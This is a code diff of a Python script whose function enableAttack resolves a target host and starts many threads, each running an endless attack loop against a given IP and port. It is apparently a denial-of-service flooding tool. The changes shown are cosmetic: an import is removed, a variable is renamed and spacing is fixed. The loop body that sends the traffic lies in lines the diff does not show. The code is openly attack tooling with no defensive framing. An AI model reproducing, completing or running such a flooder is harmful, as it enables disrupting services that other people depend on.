@@ -1,13 +1,13 @@
-import requests
 import threading
 from urllib.parse import urlparse
 import socket
 import time
 import random
 
+
 def enableAttack(ip, port, threadsCount, cooldown):
-    parsingResults = urlparse(ip)
-    ipAdd = socket.gethostbyname(parsingResults.path)
+    parsingresults = urlparse(ip)
+    ipAdd = socket.gethostbyname(parsingresults.path)
 
     def attack(ip=ip, port=port, cooldown=cooldown):
         while True:
@@ -26,7 +26,7 @@ def enableAttack(ip, port, threadsCount, cooldown):
     threads = []
     
     for _ in range(threadsCount):
-        thr = threading.Thread(target=attack) #tf tf
+        thr = threading.Thread(target=attack)  # tf tf
         thr.start()
         threads.append(thr)
 
